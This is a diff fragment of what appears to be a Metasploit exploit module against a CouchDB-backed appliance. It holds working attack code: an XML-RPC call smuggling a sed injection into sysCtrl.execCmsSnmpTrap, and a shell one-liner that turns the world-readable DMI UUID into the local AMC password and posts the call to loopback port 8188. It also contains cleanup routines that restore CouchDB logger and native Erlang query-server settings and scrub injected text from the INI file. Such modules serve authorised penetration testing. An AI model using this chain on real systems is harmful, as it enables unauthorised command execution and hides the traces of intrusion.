+    # substituteValue and reaches cmsSnmpTrap.sh as the vulnerable sed input;
+    # the remaining values preserve the method's expected call shape.
+    xml = <<~XML.delete("\n")
+      <methodCall>
+        <methodName>sysCtrl.execCmsSnmpTrap</methodName>
+        <params>
+          #{['HIGH_CMS_LICENSE_USAGE', substitute, '1', @tag].map { |value| "<param><value><string>#{xml_escape(value)}</string></value></param>" }.join}
+        </params>
+      </methodCall>
+    XML
+
+    # The world-readable DMI UUID, without hyphens, is the appliance-local AMC
+    # Basic password. This is derived at runtime, not learned from the target.
+    # curl reaches ctrl-service only on loopback TCP 8188, authenticates as AMC,
+    # and submits the XML-RPC call. Hotfix 02002 uses HTTP on that port, while
+    # 02800 uses HTTPS with an appliance-local certificate. The function keeps
+    # the shared request in one place, tries HTTP, then adds -k for the HTTPS
+    # fallback. curl alone cannot distinguish a successful XML-RPC result from
+    # a fault returned with HTTP 200, so the response body must contain
+    # methodResponse and no fault before the marker is printed.
+    <<~SHELL.delete("\n")
+      P=$(/usr/bin/tr -d - </sys/class/dmi/id/product_uuid);
+      x(){ /usr/bin/curl -fsS --max-time #{datastore['HttpClientTimeout']} -u AMC:$P
+        -H 'Content-Type: text/xml'
+        --data-binary '#{xml}'
+        "$@";};
+      R=$(x http://127.0.0.1:8188/)||R=$(x -k https://127.0.0.1:8188/)||exit 1;
+      case "$R" in
+        *'<fault>'*) exit 1;;
+        *'<methodResponse>'*) /usr/bin/printf %s #{@tag};;
+        *) exit 1;;
+      esac
+    SHELL
+  end
+
+  def delete_document(get_operation, delete_operation)
+    # CouchDB deletion is revision-controlled. Fetching the current _rev avoids
+    # a conflict if view indexing or cleanup added another probe revision. A
+    # 404 is already-clean state, which makes repeated cleanup safe.
+    res = rewrite(get_operation)
+
+    return if res&.code == 404
+
+    document = expect_response(res, 200).get_json_document
+
+    unless document.is_a?(Hash) && document['_rev'].is_a?(String)
+      raise Rex::RuntimeError, "Invalid document returned by #{get_operation}"
+    end
+
+    expect_response(rewrite(delete_operation, query: "rev=#{document['_rev']}"), 200)
+  end
+
+  def delete_tagged_state
+    # Delete the command-bearing and trigger documents before deleting the stage
+    # design document that supplies these rewrite routes. Attempt both leaf
+    # deletions even if one fails so cleanup makes as much progress as possible.
+    failures = []
+    [
+      %i[get_rce delete_rce],
+      %i[get_probe delete_probe]
+    ].each do |get_operation, delete_operation|
+      delete_document(get_operation, delete_operation)
+    rescue StandardError => e
+      failures << "#{delete_operation}: #{e.message}"
+    end
+
+    # The stage design document supplies every deletion route. Keep it if an
+    # earlier deletion failed so this invocation's second cleanup attempt can
+    # retry the remaining items.
+    raise Rex::RuntimeError, "Tagged state deletion was incomplete (#{failures.join('; ')})" unless failures.empty?
+
+    delete_document(:get_self, :delete_self)
+  end
+
+  def cleanup_chain
+    # Cleanup reverses the chain in a safe order:
+    #
+    # 1. Keep the temporary views available while they are still needed.
+    # 2. Restore the original logger and native-query-server settings.
+    # 3. Stop logging to COUCH_INI, remove the text appended to that file, and
+    #    restart CouchDB's supervised query manager with the restored settings.
+    # 4. Delete the payload, probe, and routing documents only after all state
+    #    restoration checks pass.
+    print_status('Restoring CouchDB state')
+
+    # Do not invoke native cleanup if execution stopped before logger mutation,
+    # or repeat INI truncation after it has already been verified. The recovery
+    # documents are still removed below in both cases.
+    if @logging_mutation_attempted && !@ini_scrubbed
+      # Reload may reveal that the original stage request succeeded despite a
+      # lost response. Otherwise, deliberately complete the marker injection;
+      # this gives the Erlang INI scrubber a precise truncation boundary.
+      expect_response(rewrite(:reload), 200)
+
+      # Cleanup itself requires the Erlang runtime. If an earlier asynchronous
+      # transition did not finish, reproduce the enable sequence before asking
+      # the restoration map to disable it safely.
+      enable_native_query_setting if config_value(:get_native) != 'true'
+
+      # Force a fresh logging-view revision so the unique INI marker is known to
+      # exist, then wait until couch_proc_manager has registered ERLANG.
+      update_document(@probe_id, @operations[:action] => @operations[:dirty])
+
+      activate_native_query_server
+
+      # Pass the exact pre-exploit settings through the probe document because
+      # the Erlang worker runs inside CouchDB and cannot read Ruby instance
+      # variables. The randomized restoration state permits only the
+      # restoration map to act.
+      update_document(
+        @probe_id,
+        @operations[:action] => @operations[:restore_config],
+        @operations[:restore_writer] => @original_writer,
+        @operations[:restore_file] => @original_file,
+        @operations[:restore_native] => @original_native
+      )
+
+      res = expect_response(rewrite(:restore_config), 200)
+
+      # This marker confirms that the delayed restoration worker was spawned;
+      # the configuration reads below confirm that it actually completed.
+      raise Rex::RuntimeError, 'Configuration restoration was not scheduled' unless row_contains?(res, @operations[:restore_ack])
+
+      # Verify every changed key, including absence of the transient activation
+      # key, before modifying the INI or deleting recovery documents.
+      wait_for_couchdb('CouchDB configuration restoration did not complete') do
+        config_value(:get_writer) == @original_writer &&
+          config_value(:get_file) == @original_file &&
+          config_value(:get_native) == @original_native &&
+          config_value(:get_activate).nil?
+      end
+
+      # Logger output no longer targets COUCH_INI, so the INI-scrubbing map can
+      # safely truncate data appended during exploitation without racing new writes.
+      update_document(@probe_id, @operations[:action] => @operations[:scrub_ini])
+
+      res = expect_response(rewrite(:scrub_ini), 200)
+
+      # The Erlang map emits this only after rewriting the existing inode and
+      # confirming the unique marker is absent.
+      raise Rex::RuntimeError, 'INI scrub was not verified' unless row_contains?(res, @operations[:scrub_ack])
+
+      # Prevent a successful retry from running the destructive truncation a
+      # second time if a later document deletion temporarily fails.
+      @ini_scrubbed = true
+    end
+
+    # Keep all exploit documents until configuration and INI restoration have
+    # been positively verified; they are the machinery needed for another
+    # cleanup attempt if an earlier step fails.
+    delete_tagged_state
+
+    print_good('Cleanup complete')
+  end
+
+end
